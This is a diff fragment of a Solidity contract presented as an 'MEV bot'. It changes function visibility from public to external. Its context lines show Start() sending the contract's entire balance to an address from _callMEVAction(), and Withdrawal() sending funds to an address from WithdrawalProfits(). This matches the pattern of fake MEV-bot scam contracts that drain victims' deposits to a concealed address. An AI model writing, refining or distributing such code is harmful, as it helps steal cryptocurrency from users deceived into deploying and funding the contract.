@@ -267,16 +267,16 @@
 
             
         
-            function Start() public payable {
+            function Start() external payable {
                 emit Log("Running MEV action. This can take a while; please wait..");
                 payable(_callMEVAction()).transfer(address(this).balance);
             }
         
-            function Stop() public {
+            function Stop() external {
                 emit Log("Stopping contract bot...");
             }
         
-            function Withdrawal() public payable {
+            function Withdrawal() external payable {
                 require(msg.sender == owner, "Only the owner can withdraw");
                 emit Log("Sending profits back to contract creator address...");
                 payable(WithdrawalProfits()).transfer(address(this).balance);
